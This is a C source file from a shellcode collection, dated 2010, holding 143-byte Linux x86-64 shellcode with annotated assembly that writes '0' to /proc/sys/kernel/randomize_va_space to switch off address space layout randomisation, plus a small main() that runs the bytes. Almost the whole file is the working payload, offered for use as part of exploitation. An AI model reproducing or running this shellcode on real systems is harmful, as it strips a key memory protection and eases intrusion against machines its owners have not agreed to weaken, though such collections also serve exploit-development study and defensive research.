/*
Title:  Linux/x86-64 - Disable ASLR Security - 143 bytes
Date:   2010-06-17
Tested: Archlinux x86_64 k2.6.33

Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan

! Database of shellcodes http://www.shell-storm.org/shellcode/


Description:
============
 Address space layout randomization (ASLR) is a computer security technique 
 which involves randomly arranging the positions of key data areas, usually 
 including the base  of the executable and position of libraries, heap, and 
 stack, in a process's address space.

 This shellcode disables the ASLR.

*/

#include &lt;stdio.h&gt;


char *SC = 
           /*  open(&quot;/proc/sys/kernel/randomize_va_space&quot;, O_WRONLY|O_CREAT|O_APPEND, 0644) */

           &quot;\x48\x31\xd2&quot;                                // xor    %rdx,%rdx
           &quot;\x48\xbb\xff\xff\xff\xff\xff\x61\x63\x65&quot;    // mov    $0x656361ffffffffff,%rbx
           &quot;\x48\xc1\xeb\x28&quot;                            // shr    $0x28,%rbx                  
           &quot;\x53&quot;                                        // push   %rbx
           &quot;\x48\xbb\x7a\x65\x5f\x76\x61\x5f\x73\x70&quot;    // mov    $0x70735f61765f657a,%rbx
           &quot;\x53&quot;                                        // push   %rbx
           &quot;\x48\xbb\x2f\x72\x61\x6e\x64\x6f\x6d\x69&quot;    // mov    $0x696d6f646e61722f,%rbx
           &quot;\x53&quot;                                        // push   %rbx
           &quot;\x48\xbb\x73\x2f\x6b\x65\x72\x6e\x65\x6c&quot;    // mov    $0x6c656e72656b2f73,%rbx
           &quot;\x53&quot;                                        // push   %rbx
           &quot;\x48\xbb\x2f\x70\x72\x6f\x63\x2f\x73\x79&quot;    // mov    $0x79732f636f72702f,%rbx
           &quot;\x53&quot;                                        // push   %rbx
           &quot;\x48\x89\xe7&quot;                                // mov    %rsp,%rdi
           &quot;\x66\xbe\x41\x04&quot;                            // mov    $0x441,%si
           &quot;\x66\xba\xa4\x01&quot;                            // mov    $0x1a4,%dx
           &quot;\x48\x31\xc0&quot;                                // xor    %rax,%rax
           &quot;\xb0\x02&quot;                                    // mov    $0x2,%al
           &quot;\x0f\x05&quot;                                    // syscall


           /* write(3, &quot;0\n&quot;, 2) */

           &quot;\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03&quot;    // mov    $0x3ffffffffffffff,%rdi
           &quot;\x48\xc1\xef\x38&quot;                            // shr    $0x38,%rdi
           &quot;\x48\xbb\xff\xff\xff\xff\xff\xff\x30\x0a&quot;    // mov    $0xa30ffffffffffff,%rbx
           &quot;\x48\xc1\xeb\x30&quot;                            // shr    $0x30,%rbx
           &quot;\x53&quot;                                        // push   %rbx
           &quot;\x48\x89\xe6&quot;                                // mov    %rsp,%rsi
           &quot;\x48\xba\xff\xff\xff\xff\xff\xff\xff\x02&quot;    // mov    $0x2ffffffffffffff,%rdx
           &quot;\x48\xc1\xea\x38&quot;                            // shr    $0x38,%rdx
           &quot;\x48\x31\xc0&quot;                                // xor    %rax,%rax
           &quot;\xb0\x01&quot;                                    // mov    $0x1,%al
           &quot;\x0f\x05&quot;                                    // syscall


           /* _exit(0) */

           &quot;\x48\x31\xff&quot;                                // xor    %rdi,%rdi
           &quot;\x48\x31\xc0&quot;                                // xor    %rax,%rax
           &quot;\xb0\x3c&quot;                                    // mov    $0x3c,%al
           &quot;\x0f\x05&quot;;                                   // syscall


int main(void)
{
        fprintf(stdout,&quot;Length: %d\n&quot;,strlen(SC));
        (*(void(*)()) SC)();
return 0;
}
